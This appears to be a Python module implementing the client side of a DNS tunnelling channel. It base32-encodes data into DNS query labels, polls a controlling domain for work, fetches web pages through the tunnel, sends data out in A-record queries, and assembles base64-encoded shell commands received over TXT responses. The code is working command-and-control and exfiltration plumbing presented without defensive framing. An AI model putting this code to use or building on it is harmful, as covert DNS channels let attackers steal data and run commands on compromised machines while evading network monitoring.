import threading
import base64
import binascii
import dns.message
import dns.name
import dns.rdatatype
from enum import Enum


class StateEnum(Enum):
    IDLE = 'idle'
    POLL = 'poll'
    CURL = 'curl'
    REQUESTING_ID = 'requesting_id'
    SENDING_DATA = 'sending_data'
    RECEIVING_DATA = 'receiving_data'
    RECEIVING_SHELL = 'receiving_shell'


class TransmissionState:

    def __init__(self, data: str, data_prefix: str):
        self._data = base64.b32encode(data.encode('utf-8')).decode('utf-8')
        self._data_prefix = data_prefix

    def get_next_data(self) -> tuple[str, bool]:
        if not self._data:
            return f"0.{self._data_prefix}"

        next_data = self._data_prefix
        for i in range(3):
            if not self._data:
                break
            next_data = f"{self._data[:63]}.{next_data}"
            self._data = self._data[63:]

        if not self._data:
            next_data = f"0.{next_data}"

        return next_data, not self._data


class ClientState:

    def __init__(self):
        self.__client_id = None
        self.__state = {
            'state': StateEnum.IDLE,
            'transmission': None,
            'transmission_type': dns.rdatatype.A,
            'command': b"",
        }
        self.__data_storage = []
        self.__current_data = []

        self.__state_lock = threading.Lock()
        self.__data_storage_lock = threading.Lock()

    @property
    def state_lock(self) -> threading.Lock:
        return self.__state_lock

    @property
    def data_storage_lock(self) -> threading.Lock:
        return self.__data_storage_lock

    @property
    def client_id(self):
        return self.__client_id

    @client_id.setter
    def client_id(self, value):
        self.__client_id = value

    @property
    def state(self):
        return self.__state

    def set_state(self, state: dict[str, any]) -> None:
        with self.__state_lock:
            for k, v in state.items():
                self.__state[k] = v

    @property
    def data_storage(self):
        return self.__data_storage

    def add_data_to_storage(self, data: bytes, done: bool) -> None:
        with self.__data_storage_lock:
            self.__current_data.append(data)

            if done:
                d = b"".join(self.__current_data)
                try:
                    d = base64.b64decode(d).decode('utf-8')
                except binascii.Error:
                    d = ""

                self.__current_data = []
                self.__data_storage.append(d)


class ClientStateRequestHandler:

    def __init__(self, client_state: ClientState, domain: str):
        self._client_state = client_state
        self._domain = domain

    def request_id(self) -> dns.message.Message:
        self._client_state.set_state({'state': StateEnum.REQUESTING_ID})

        domain = dns.name.from_text(f"requestid.{self._domain}")
        return dns.message.make_query(domain, dns.rdatatype.A)

    def poll(self) -> dns.message.Message:
        self._client_state.set_state({'state': StateEnum.POLL})

        domain = dns.name.from_text(f"poll.{self._client_state.client_id}.{self._domain}")
        return dns.message.make_query(domain, dns.rdatatype.TXT)

    def continue_request(self) -> dns.message.Message:
        domain = dns.name.from_text(f"continue.{self._client_state.client_id}.{self._domain}")
        return dns.message.make_query(domain, dns.rdatatype.TXT)

    def continue_last_request(self) -> tuple[dns.message.Message, bool]:
        with self._client_state.state_lock:
            data, done = self._client_state.state['transmission'].get_next_data()
            data_type = self._client_state.state['transmission_type']
            domain = dns.name.from_text(f"{data}.{self._domain}")
            return dns.message.make_query(domain, data_type), done

    def curl(self, webpage: str) -> tuple[dns.message.Message, bool]:
        transmission = TransmissionState(webpage, f'curl.{self._client_state.client_id}')
        self._client_state.set_state({
            'state': StateEnum.CURL,
            'transmission': transmission,
            'transmission_type': dns.rdatatype.TXT,
        })

        with self._client_state.state_lock:
            curl_page, done = self._client_state.state['transmission'].get_next_data()

        domain = dns.name.from_text(f"{curl_page}.{self._domain}")
        return dns.message.make_query(domain, dns.rdatatype.TXT), done

    def data(self, data: str, is_head: bool) -> tuple[dns.message.Message, bool]:
        data_type = 'head' if is_head else 'body'
        transmission = TransmissionState(data, f'{data_type}.data.{self._client_state.client_id}')
        self._client_state.set_state({
            'state': StateEnum.SENDING_DATA,
            'transmission': transmission,
            'transmission_type': dns.rdatatype.A,
        })

        with self._client_state.state_lock:
            data, done = self._client_state.state['transmission'].get_next_data()

        domain = dns.name.from_text(f"{data}.{self._domain}")
        return dns.message.make_query(domain, dns.rdatatype.A), done


class ClientStateResponseHandler:

    def __init__(self, client_state: ClientState):
        self._client_state = client_state

    def client_id(self, client_id: int) -> None:
        self._client_state.client_id = client_id

    def data(self, data: bytes, done: bool) -> None:
        if done:
            self._client_state.set_state({'state': StateEnum.IDLE})
        else:
            self._client_state.set_state({'state': StateEnum.RECEIVING_DATA})
        self._client_state.add_data_to_storage(data, done)

    def command(self, command: bytes, done: bool) -> str:
        with self._client_state.state_lock:
            current_command = self._client_state.state['command']

        appended_command = current_command + command

        self._client_state.set_state({
            'state': StateEnum.RECEIVING_SHELL,
            'command': appended_command
        })

        if done:
            command = base64.b64decode(appended_command).decode('utf-8')

            self._client_state.set_state({
                'state': StateEnum.IDLE,
                'command': b"",
            })
            return command
        else:
            return ""


class ClientStateReader:

    def __init__(self, client_state: ClientState):
        self._client_state = client_state

    def read_state(self) -> StateEnum:
        with self._client_state.state_lock:
            return self._client_state.state['state']

    def read_latest_data(self) -> str:
        with self._client_state.data_storage_lock:
            return self._client_state.data_storage[-1]
